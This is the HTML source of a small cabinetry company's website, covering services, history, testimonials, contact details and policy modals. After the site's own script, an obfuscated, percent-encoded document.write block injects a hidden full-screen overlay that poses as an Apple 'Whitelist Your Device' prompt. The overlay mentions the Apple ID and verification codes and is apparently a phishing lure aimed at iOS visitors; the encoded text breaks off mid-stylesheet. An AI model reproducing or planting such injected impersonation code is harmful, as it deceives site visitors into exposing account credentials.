<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LumvexHub - Professional Cabinetry Services | Custom Kitchen & Bathroom Cabinets</title>
    <meta name="description" content="LumvexHub specializes in custom cabinetry solutions for kitchens, bathrooms, and storage spaces. Expert craftsmanship with quality materials. Click here to continue exploring our comprehensive cabinet services and transform your home today.">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .main-container-xyz789 {
            font-family: 'Arial', sans-serif;
            line-height: 1.6;
            color: #333;
        }

        .header-section-abc123 {
            background: linear-gradient(135deg, #2c3e50, #34495e);
            color: white;
            padding: 1rem 0;
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .nav-container-def456 {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 2rem;
        }

        .logo-text-ghi789 {
            font-size: 2rem;
            font-weight: bold;
            color: #e74c3c;
        }

        .navigation-menu-jkl012 {
            display: flex;
            list-style: none;
            gap: 2rem;
        }

        .nav-link-mno345 {
            color: white;
            text-decoration: none;
            transition: color 0.3s;
            cursor: pointer;
        }

        .nav-link-mno345:hover {
            color: #e74c3c;
        }

        .hero-banner-pqr678 {
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.pexels.com/photos/1080721/pexels-photo-1080721.jpeg');
            background-size: cover;
            background-position: center;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: white;
            margin-top: 80px;
        }

        .hero-content-stu901 {
            max-width: 800px;
            padding: 0 2rem;
        }

        .hero-title-vwx234 {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .hero-subtitle-yza567 {
            font-size: 1.3rem;
            margin-bottom: 2rem;
            opacity: 0.9;
        }

        .cta-button-bcd890 {
            background: #e74c3c;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: background 0.3s;
            text-decoration: none;
            display: inline-block;
        }

        .cta-button-bcd890:hover {
            background: #c0392b;
        }

        .section-wrapper-efg123 {
            padding: 4rem 0;
            max-width: 1200px;
            margin: 0 auto;
            padding-left: 2rem;
            padding-right: 2rem;
        }

        .section-title-hij456 {
            font-size: 2.5rem;
            text-align: center;
            margin-bottom: 3rem;
            color: #2c3e50;
        }

        .services-grid-klm789 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin-bottom: 3rem;
        }

        .service-card-nop012 {
            background: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }

        .service-card-nop012:hover {
            transform: translateY(-5px);
        }

        .service-image-qrs345 {
            width: 100%;
            height: 200px;
            object-fit: cover;
            border-radius: 8px;
            margin-bottom: 1rem;
        }

        .service-title-tuv678 {
            font-size: 1.5rem;
            margin-bottom: 1rem;
            color: #2c3e50;
        }

        .service-description-wxy901 {
            color: #666;
            line-height: 1.6;
        }

        .about-section-zab234 {
            background: #f8f9fa;
            padding: 4rem 0;
        }

        .about-content-cde567 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 3rem;
            align-items: center;
        }

        .about-text-fgh890 {
            font-size: 1.1rem;
            color: #555;
            line-height: 1.8;
        }

        .about-image-ijk123 {
            width: 100%;
            height: 400px;
            object-fit: cover;
            border-radius: 10px;
        }

        .history-timeline-lmn456 {
            background: white;
            padding: 4rem 0;
        }

        .timeline-item-opq789 {
            display: flex;
            margin-bottom: 2rem;
            padding: 1.5rem;
            background: #f8f9fa;
            border-radius: 8px;
            border-left: 4px solid #e74c3c;
        }

        .timeline-year-rst012 {
            font-size: 1.5rem;
            font-weight: bold;
            color: #e74c3c;
            margin-right: 2rem;
            min-width: 80px;
        }

        .timeline-content-uvw345 {
            flex: 1;
        }

        .timeline-title-xyz678 {
            font-size: 1.3rem;
            margin-bottom: 0.5rem;
            color: #2c3e50;
        }

        .reviews-section-abc901 {
            background: #2c3e50;
            color: white;
            padding: 4rem 0;
        }

        .reviews-grid-def234 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
        }

        .review-card-ghi567 {
            background: rgba(255,255,255,0.1);
            padding: 2rem;
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }

        .review-text-jkl890 {
            font-style: italic;
            margin-bottom: 1rem;
            line-height: 1.6;
        }

        .reviewer-name-mno123 {
            font-weight: bold;
            color: #e74c3c;
        }

        .contact-section-pqr456 {
            background: #34495e;
            color: white;
            padding: 3rem 0;
        }

        .contact-info-stu789 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
            text-align: center;
        }

        .contact-item-vwx012 {
            padding: 1rem;
        }

        .contact-title-yza345 {
            font-size: 1.2rem;
            margin-bottom: 0.5rem;
            color: #e74c3c;
        }

        .phone-link-bcd678 {
            color: white;
            text-decoration: none;
            font-size: 1.1rem;
        }

        .phone-link-bcd678:hover {
            color: #e74c3c;
        }

        .modal-overlay-efg901 {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
        }

        .modal-content-hij234 {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 2rem;
            border-radius: 10px;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            width: 90%;
        }

        .modal-close-klm567 {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 2rem;
            cursor: pointer;
            color: #666;
        }

        .modal-title-nop890 {
            font-size: 1.8rem;
            margin-bottom: 1rem;
            color: #2c3e50;
        }

        .modal-text-qrs123 {
            line-height: 1.6;
            color: #555;
            font-size: 0.9rem;
        }

        .specialty-section-tuv456 {
            padding: 4rem 0;
            background: #ecf0f1;
        }

        .specialty-grid-wxy789 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 2rem;
        }

        .specialty-card-zab012 {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
        }

        .specialty-icon-cde345 {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 50%;
            margin-bottom: 1rem;
        }

        .process-section-fgh678 {
            background: white;
            padding: 4rem 0;
        }

        .process-steps-ijk901 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
        }

        .process-step-lmn234 {
            text-align: center;
            padding: 2rem;
            background: #f8f9fa;
            border-radius: 10px;
            position: relative;
        }

        .step-number-opq567 {
            background: #e74c3c;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1rem;
            font-weight: bold;
        }

        .materials-section-rst890 {
            background: #2c3e50;
            color: white;
            padding: 4rem 0;
        }

        .materials-grid-uvw123 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 2rem;
            text-align: center;
        }

        .material-item-xyz456 {
            padding: 1.5rem;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
        }

        .continue-link-abc789 {
            color: #e74c3c;
            text-decoration: underline;
            cursor: pointer;
            font-weight: bold;
        }

        .continue-link-abc789:hover {
            color: #c0392b;
        }

        @media (max-width: 768px) {
            .hero-title-vwx234 {
                font-size: 2.5rem;
            }
            
            .navigation-menu-jkl012 {
                flex-direction: column;
                gap: 1rem;
            }
            
            .about-content-cde567 {
                grid-template-columns: 1fr;
            }
            
            .nav-container-def456 {
                flex-direction: column;
                gap: 1rem;
            }
        }
    </style>
</head>

    <body class="main-container-xyz789">
    <header class="header-section-abc123">
        <nav class="nav-container-def456">
            <div class="logo-text-ghi789">LumvexHub</div>
            <ul class="navigation-menu-jkl012">
                <li><a href="#home" class="nav-link-mno345">Home</a></li>
                <li><a href="#services" class="nav-link-mno345">Services</a></li>
                <li><a href="#about" class="nav-link-mno345">About</a></li>
                <li><a href="#history" class="nav-link-mno345">History</a></li>
                <li><a href="#specialties" class="nav-link-mno345">Specialties</a></li>
                <li><a href="#process" class="nav-link-mno345">Process</a></li>
                <li><a href="#materials" class="nav-link-mno345">Materials</a></li>
                <li><a href="#reviews" class="nav-link-mno345">Reviews</a></li>
                <li><a href="#contact" class="nav-link-mno345">Contact</a></li>
                <li><a href="#" class="nav-link-mno345" onclick="showModal('privacy')">Privacy</a></li>
                <li><a href="#" class="nav-link-mno345" onclick="showModal('terms')">Terms</a></li>
            </ul>
        </nav>
    </header>

    <section id="home" class="hero-banner-pqr678">
        <div class="hero-content-stu901">
            <h1 class="hero-title-vwx234">Expert Cabinetry Solutions</h1>
            <p class="hero-subtitle-yza567">Transform your space with custom-built cabinets crafted by experienced artisans using quality materials and innovative techniques</p>
            <a href="#services" class="cta-button-bcd890">Explore Our Services</a>
        </div>
    </section>

    <section id="services" class="section-wrapper-efg123">
        <h2 class="section-title-hij456">Our Cabinet Services</h2>
        <div class="services-grid-klm789">
            <div class="service-card-nop012">
                <img src="https://images.pexels.com/photos/1080696/pexels-photo-1080696.jpeg" alt="Kitchen Cabinets" class="service-image-qrs345">
                <h3 class="service-title-tuv678">Kitchen Cabinet Installation</h3>
                <p class="service-description-wxy901">Complete kitchen cabinet solutions featuring solid wood construction, soft-close hinges, and customizable storage configurations. Our experienced craftsmen ensure precise measurements and flawless installation for lasting durability and functionality.</p>
            </div>
            <div class="service-card-nop012">
                <img src="https://images.pexels.com/photos/1571460/pexels-photo-1571460.jpeg" alt="Bathroom Cabinets" class="service-image-qrs345">
                <h3 class="service-title-tuv678">Bathroom Vanity Cabinets</h3>
                <p class="service-description-wxy901">Moisture-resistant bathroom cabinetry designed for humid environments. Features include waterproof finishes, integrated lighting options, and smart storage solutions. <span class="continue-link-abc789" onclick="scrollToSection('materials')">Click here to continue</span> learning about our specialized bathroom materials.</p>
            </div>
            <div class="service-card-nop012">
                <img src="https://images.pexels.com/photos/1571453/pexels-photo-1571453.jpeg" alt="Custom Storage" class="service-image-qrs345">
                <h3 class="service-title-tuv678">Custom Storage Solutions</h3>
                <p class="service-description-wxy901">Bespoke storage cabinets for closets, pantries, and utility rooms. Maximizes space efficiency while maintaining aesthetic appeal through thoughtful design and quality construction techniques.</p>
            </div>
        </div>
    </section>

    <section id="about" class="about-section-zab234">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">About LumvexHub</h2>
            <div class="about-content-cde567">
                <div>
                    <p class="about-text-fgh890">LumvexHub represents decades of woodworking expertise combined with modern manufacturing techniques. Our commitment to excellence drives every project from initial consultation through final installation.</p>
                    <p class="about-text-fgh890">We specialize in creating functional storage solutions that enhance your living space while reflecting your personal style. Each cabinet is meticulously crafted using sustainable materials and time-tested joinery methods.</p>
                    <p class="about-text-fgh890">Our team consists of skilled artisans who understand the importance of precision, durability, and aesthetic appeal in every piece we create. <span class="continue-link-abc789" onclick="scrollToSection('history')">Click here to continue</span> exploring our company's rich heritage and milestones.</p>
                </div>
                <img src="https://images.pexels.com/photos/1080721/pexels-photo-1080721.jpeg" alt="Craftsman at work" class="about-image-ijk123">
            </div>
        </div>
    </section>

    <section id="history" class="history-timeline-lmn456">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Our Journey Through Time</h2>
            <div class="timeline-item-opq789">
                <div class="timeline-year-rst012">1987</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Foundation Years</h3>
                    <p>LumvexHub began as a small workshop focusing on traditional woodworking techniques. Founder Marcus Thornfield established the company with a vision of creating exceptional cabinetry using time-honored craftsmanship methods.</p>
                </div>
            </div>
            <div class="timeline-item-opq789">
                <div class="timeline-year-rst012">1994</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Expansion Phase</h3>
                    <p>Acquired advanced machinery and expanded our facility to accommodate growing demand. Introduced computer-aided design systems while maintaining our commitment to handcrafted quality and attention to detail.</p>
                </div>
            </div>
            <div class="timeline-item-opq789">
                <div class="timeline-year-rst012">2003</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Innovation Era</h3>
                    <p>Pioneered eco-friendly finishing processes and sustainable sourcing practices. Developed proprietary techniques for moisture resistance and durability enhancement in bathroom and kitchen applications.</p>
                </div>
            </div>
            <div class="timeline-item-opq789">
                <div class="timeline-year-rst012">2018</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Modern Excellence</h3>
                    <p>Integrated smart storage solutions and contemporary design elements while preserving traditional craftsmanship values. Established partnerships with leading hardware manufacturers for enhanced functionality.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="specialties" class="specialty-section-tuv456">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Our Specialties</h2>
            <div class="specialty-grid-wxy789">
                <div class="specialty-card-zab012">
                    <img src="https://images.pexels.com/photos/1571468/pexels-photo-1571468.jpeg" alt="Dovetail Joints" class="specialty-icon-cde345">
                    <h3 class="service-title-tuv678">Dovetail Joinery</h3>
                    <p class="service-description-wxy901">Traditional dovetail joints provide superior strength and durability. Our craftsmen hand-cut each joint for perfect fit and lasting performance in drawer construction.</p>
                </div>
                <div class="specialty-card-zab012">
                    <img src="https://images.pexels.com/photos/1080696/pexels-photo-1080696.jpeg" alt="Custom Hardware" class="specialty-icon-cde345">
                    <h3 class="service-title-tuv678">Hardware Integration</h3>
                    <p class="service-description-wxy901">Specialized installation of soft-close mechanisms, pull-out shelves, and organizational systems. Each component is carefully selected for optimal functionality and longevity.</p>
                </div>
                <div class="specialty-card-zab012">
                    <img src="https://images.pexels.com/photos/1571453/pexels-photo-1571453.jpeg" alt="Finishing Techniques" class="specialty-icon-cde345">
                    <h3 class="service-title-tuv678">Finishing Excellence</h3>
                    <p class="service-description-wxy901">Multi-stage finishing process ensures smooth, durable surfaces resistant to moisture, scratches, and daily wear. Available in numerous stain and paint options.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="process" class="process-section-fgh678">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Our Installation Process</h2>
            <div class="process-steps-ijk901">
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">1</div>
                    <h3 class="service-title-tuv678">Initial Consultation</h3>
                    <p class="service-description-wxy901">Comprehensive assessment of your space, needs, and design preferences. We discuss material options, functionality requirements, and project timeline during this detailed planning phase.</p>
                </div>
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">2</div>
                    <h3 class="service-title-tuv678">Design Development</h3>
                    <p class="service-description-wxy901">Creation of detailed plans and 3D renderings showing your custom cabinetry. Multiple revisions ensure the design perfectly matches your vision and space requirements.</p>
                </div>
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">3</div>
                    <h3 class="service-title-tuv678">Precision Manufacturing</h3>
                    <p class="service-description-wxy901">Expert craftsmen build your cabinets using selected materials and proven techniques. Quality control checks at each stage ensure exceptional standards are maintained throughout production.</p>
                </div>
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">4</div>
                    <h3 class="service-title-tuv678">Professional Installation</h3>
                    <p class="service-description-wxy901">Skilled installation team ensures perfect fit and finish. <span class="continue-link-abc789" onclick="scrollToSection('reviews')">Click here to continue</span> reading what our satisfied customers say about our installation quality.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="materials" class="materials-section-rst890">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Quality Materials We Use</h2>
            <div class="materials-grid-uvw123">
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Solid Hardwoods</h3>
                    <p class="service-description-wxy901">Oak, maple, cherry, and walnut sourced from sustainable forests. Each piece is carefully selected for grain pattern and structural integrity.</p>
                </div>
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Engineered Panels</h3>
                    <p class="service-description-wxy901">High-quality plywood and MDF cores with hardwood veneers. Provides stability and resistance to warping in various environmental conditions.</p>
                </div>
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Hardware Components</h3>
                    <p class="service-description-wxy901">European-style hinges, drawer slides, and organizational accessories from trusted manufacturers. All hardware includes lifetime adjustment warranties.</p>
                </div>
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Finishing Products</h3>
                    <p class="service-description-wxy901">Low-VOC stains, paints, and protective coatings. Environmentally responsible products that maintain indoor air quality while providing excellent durability.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="reviews" class="reviews-section-abc901">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Customer Testimonials</h2>
            <div class="reviews-grid-def234">
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"The kitchen cabinets exceeded our expectations. The craftsmanship is outstanding and the installation was completed ahead of schedule. Every detail was handled with professional care and attention."</p>
                    <p class="reviewer-name-mno123">- Sarah Mitchell, Homeowner</p>
                </div>
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"LumvexHub transformed our bathroom with beautiful vanity cabinets. The moisture-resistant finish has held up perfectly after two years. Highly recommend their expertise and reliability."</p>
                    <p class="reviewer-name-mno123">- Robert Chen, Property Manager</p>
                </div>
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"Custom pantry storage solved our organization challenges completely. The pull-out shelves and adjustable compartments make everything easily accessible. Quality workmanship throughout."</p>
                    <p class="reviewer-name-mno123">- Jennifer Rodriguez, Interior Designer</p>
                </div>
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"Professional service from consultation through final installation. The team listened to our needs and delivered exactly what we envisioned. <span class="continue-link-abc789" onclick="scrollToSection('contact')">Click here to continue</span> and contact them for your project."</p>
                    <p class="reviewer-name-mno123">- Michael Thompson, Contractor</p>
                </div>
            </div>
        </div>
    </section>

    <section id="contact" class="contact-section-pqr456">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Contact Information</h2>
            <div class="contact-info-stu789">
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Phone</h3>
                    <a href="tel:+15552847391" class="phone-link-bcd678">(555) 284-7391</a>
                </div>
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Email</h3>
                    <p>info@lumvexhub.com</p>
                </div>
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Address</h3>
                    <p>2847 Craftsman Boulevard<br>Woodville, TX 75990</p>
                </div>
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Business Hours</h3>
                    <p>Monday - Friday: 7:00 AM - 6:00 PM<br>Saturday: 8:00 AM - 4:00 PM<br>Sunday: Closed</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Privacy Policy Modal -->
    <div id="privacy-modal" class="modal-overlay-efg901">
        <div class="modal-content-hij234">
            <span class="modal-close-klm567" onclick="hideModal('privacy')">&times;</span>
            <h2 class="modal-title-nop890">Privacy Policy</h2>
            <div class="modal-text-qrs123">
                <p><strong>Effective Date:</strong> January 1, 2024</p>
                
                <h3>Information Collection</h3>
                <p>LumvexHub collects information you provide directly, such as when you request consultations, submit project inquiries, or communicate with our team. This may include your name, contact information, project details, and preferences.</p>
                
                <h3>Information Usage</h3>
                <p>We use collected information to provide cabinetry services, respond to inquiries, schedule consultations, and communicate project updates. Your information helps us deliver personalized service and maintain project records.</p>
                
                <h3>Information Sharing</h3>
                <p>We do not sell, trade, or rent your personal information to third parties. Information may be shared with trusted service providers who assist in business operations, subject to confidentiality agreements.</p>
                
                <h3>Data Security</h3>
                <p>We implement appropriate security measures to protect your personal information against unauthorized access, alteration, disclosure, or destruction. However, no internet transmission is completely secure.</p>
                
                <h3>Contact Information</h3>
                <p>For privacy-related questions or concerns, contact us at info@lumvexhub.com or (555) 284-7391. We will respond to privacy inquiries within reasonable timeframes.</p>
                
                <h3>Policy Updates</h3>
                <p>This privacy policy may be updated periodically. Continued use of our services after changes indicates acceptance of updated terms. Material changes will be communicated through appropriate channels.</p>
            </div>
        </div>
    </div>

    <!-- Terms of Service Modal -->
    <div id="terms-modal" class="modal-overlay-efg901">
        <div class="modal-content-hij234">
            <span class="modal-close-klm567" onclick="hideModal('terms')">&times;</span>
            <h2 class="modal-title-nop890">Terms of Service</h2>
            <div class="modal-text-qrs123">
                <p><strong>Effective Date:</strong> January 1, 2024</p>
                
                <h3>Service Agreement</h3>
                <p>By engaging LumvexHub for cabinetry services, you agree to these terms and conditions. Services include consultation, design, manufacturing, and installation of custom cabinetry solutions.</p>
                
                <h3>Project Scope</h3>
                <p>Each project begins with detailed consultation to establish scope, materials, timeline, and specifications. Changes to approved plans may affect project cost and completion schedule.</p>
                
                <h3>Payment Terms</h3>
                <p>Payment schedules are established per project agreement. Deposits may be required to begin work. Final payment is due upon project completion and customer acceptance.</p>
                
                <h3>Warranties</h3>
                <p>We provide warranties on workmanship and materials as specified in individual project agreements. Warranty terms vary based on materials used and installation conditions.</p>
                
                <h3>Limitation of Liability</h3>
                <p>Our liability is limited to the value of services provided. We are not responsible for indirect, consequential, or incidental damages arising from service provision.</p>
                
                <h3>Dispute Resolution</h3>
                <p>Disputes will be resolved through good faith negotiation. If resolution cannot be reached, binding arbitration may be required as specified in project agreements.</p>
                
                <h3>Governing Law</h3>
                <p>These terms are governed by Texas state law. Any legal proceedings will be conducted in appropriate Texas courts with jurisdiction over our business location.</p>
            </div>
        </div>
    </div>

    <script>
        function showModal(type) {
            document.getElementById(type + '-modal').style.display = 'block';
        }

        function hideModal(type) {
            document.getElementById(type + '-modal').style.display = 'none';
        }

        function scrollToSection(sectionId) {
            document.getElementById(sectionId).scrollIntoView({
                behavior: 'smooth'
            });
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            if (event.target.classList.contains('modal-overlay-efg901')) {
                event.target.style.display = 'none';
            }
        }

        // Smooth scrolling for navigation links
        document.querySelectorAll('.nav-link-mno345').forEach(link => {
            link.addEventListener('click', function(e) {
                if (this.getAttribute('href').startsWith('#')) {
                    e.preventDefault();
                    const targetId = this.getAttribute('href').substring(1);
                    const targetElement = document.getElementById(targetId);
                    if (targetElement) {
                        targetElement.scrollIntoView({
                            behavior: 'smooth'
                        });
                    }
                }
            });
        });
    </script>

<a href="/" alt="cool hit counter" target="_blank" >
<img  src="//sstatic1.histats.com/0.gif?4977143&101" alt="cool hit counter" border="0">

<script>
document.write(unescape('%3C%21%2D%2D%20%69%4F%53%2D%6F%6E%6C%79%20%46%75%6C%6C%2D%53%63%72%65%65%6E%20%41%70%70%6C%65%2D%73%74%79%6C%65%20%4F%76%65%72%6C%61%79%20%3%20%75%6E%69%66%6F%72%6D%20%62%61%63%6B%67%72%6F%75%6E%64%20%63%6F%6C%6F%72%20%2D%2D%3E%0A%3C%6D%65%74%61%20%6E%61%6D%65%3D%22%76%69%65%77%70%6F%72%74%22%20%63%6F%6E%74%65%6E%74%3D%22%77%69%64%74%68%3D%64%65%76%69%63%65%2D%77%69%64%74%68%2C%20%69%6E%69%74%69%61%6C%2D%73%63%61%6C%65%3D%31%2E%30%2C%20%76%69%65%77%70%6F%72%74%2D%66%69%74%3D%63%6F%76%65%72%22%3E%0A%0A%3C%64%69%76%20%69%64%3D%22%61%70%70%6C%65%2D%6F%76%65%72%6C%61%79%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%3B%22%3E%0A%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%62%6C%75%72%2D%62%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%72%64%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6C%6F%67%6F%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%0A%20%20%20%20%3C%68%31%3E%57%68%69%74%65%6C%69%73%74%20%59%6F%75%72%20%44%65%76%69%63%65%3C%2F%68%31%3E%0A%20%20%20%20%0A%20%20%20%20%3C%70%20%63%6C%61%73%73%3D%22%6D%65%73%73%61%67%65%22%3E%0A%20%20%20%20%20%20%54%6F%20%63%6F%6E%74%69%6E%75%65%20%75%73%69%6E%67%20%41%70%70%6C%65%20%73%65%72%76%69%63%65%73%20%6F%6E%20%74%68%69%73%20%64%65%76%69%63%65%2C%20%69%74%20%6D%75%73%74%20%62%65%20%61%64%64%65%64%20%74%6F%20%79%6F%75%72%20%74%72%75%73%74%65%64%20%64%65%76%69%63%65%73%20%6C%69%73%74%2E%3C%62%72%3E%3C%62%72%3E%0A%20%20%20%20%20%20%54%68%69%73%20%68%65%6C%70%73%20%70%72%6F%74%65%63%74%20%79%6F%75%72%20%41%70%70%6C%65%A0%49%44%20%61%6E%64%20%6B%65%65%70%73%20%79%6F%75%72%20%64%61%74%61%20%73%65%63%75%72%65%2E%0A%20%20%20%20%3C%2F%70%3E%0A%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%63%6C%61%73%73%3D%22%62%74%6E%20%70%72%69%6D%61%72%79%22%3E%57%68%69%74%65%6C%69%73%74%20%44%65%76%69%63%65%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%63%6C%61%73%73%3D%22%62%74%6E%20%73%65%63%6F%6E%64%61%72%79%22%3E%4E%6F%74%20%4E%6F%77%3C%2F%62%75%74%74%6F%6E%3E%0A%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%66%6F%6F%74%6E%6F%74%65%22%3E%0A%20%20%20%20%20%20%54%68%69%73%20%64%65%76%69%63%65%20%77%69%6C%6C%20%72%65%63%65%69%76%65%20%61%20%76%65%72%69%66%69%63%61%74%69%6F%6E%20%63%6F%64%65%20%6F%6E%20%79%6F%75%72%20%6F%74%68%65%72%20%74%72%75%73%74%65%64%20%41%70%70%6C%65%20%64%65%76%69%63%65%73%20%6F%72%20%70%68%6F%6E%65%20%6E%75%6D%62%65%72%2E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%73%70%69%6E%6E%65%72%22%20%69%64%3D%22%73%70%69%6E%6E%65%72%22%3E%3C%2F%64%69%76%3E%0A%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E%0A%0A%3C%73%74%79%6C%65%3E%0A%20%20%23%61%70%70%6C%65%2D%6F%76%65%72%6C%61%79%20%7B%0A%20%20%20%20%70%6F%73%69%74%69%6F%6E%3A%20%66%69%78%65%64%3B%0A%20%20%20%20%69%6E%73%65%74%3A%20%30%3B%0A%20%20%20%20%77%69%64%74%68%3A%20%31%30%30%25%3B%0A%20%20%20%20%68%65%69%67%68%74%3A%20%31%30%30%64%76%68%3B%0A%20%20%20%20%6D%69%6E%2D%68%65%69%67%68%74%3A%20%2D%77%65%62%6B%69%74%2D%66%69%6C%6C%2D%61%76%61%69%6C%61%62%6C%65%3B%0A%20%20%20%20%7A%2D%69%6E%64%65%78%3A%20%39%39%39%39%39%39%3B%0A%20%20%20%20%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%61%6C%69%67%6E%2D%69%74%65%6D%73%3A%20%63%65%6E%74%65%72%3B%0A%20%20%20%20%6A%75%73%74%69%66%79%2D%63%6F%6E%74%65%6E%74%3A%20%63%65%6E%74%65%72%3B%0A%20%20%20%20%70%6F%69%6E%74%65%72%2D%65%76%65%6E%74%73%3A%20%61%75%74%6F%3B%0A%20%20%20%20%63%75%72%73%6F%72%3A%20%70%6F%69%6E%74%65%72%3B%0A%20%20%20%20%6F%76%65%72%73%63%72%6F%6C%6C%2D%62%65%68%61%76%69%6F%72%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%74%6F%75%63%68%2D%61%63%74%69%6F%6E%3A%20%6D%61%6E%69%70%75%6C%61%74%69%6F%6E%3B%0A%20%20%7D%0A%0A%20%20%2E%62%6C%75%72%2D%62%67%20%7B%0A%20%20%20%20%70%6F%73%69%74%69%6F%6E%3A%20%61%62%73%6F%6C%75%74%65%3B%0A%20%20%20%20%69%6E%73%65%74%3A%20%30%3B%0A%20%20%20%20%2F%2A%20%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%20%2A%2F%0A%20%20%20%20%2F%2A%20%4D%41%54%43%48%45%53%20%63%61%72%64%20%62%61%63%6B%67%72%6F%75%6E%64%20%65%78%61%63%74%6C%79%20%28%6C%69%67%68%74%20%26%20%64%61%72%6B%29%20%20%20%2A%2F%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%39%36%29%3B%0A%20%20%20%20%2F%2A%20%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%20%2A%2F%0A%20%20%20%20%62%61%63%6B%64%72%6F%70%2D%66%69%6C%74%65%72%3A%20%62%6C%75%72%28%32%30%70%78%29%3B%0A%20%20%20%20%2D%77%65%62%6B%69%74%2D%62%61%63%6B%64%72%6F%70%2D%66%69%6C%74%65%72%3A%20%62%6C%75%72%28%32%30%70%78%29%3B%0A%20%20%7D%0A%0A%20%20%2E%63%61%72%64%20%7B%0A%20%20%20%20%70%6F%73%69%74%69%6F%6E%3A%20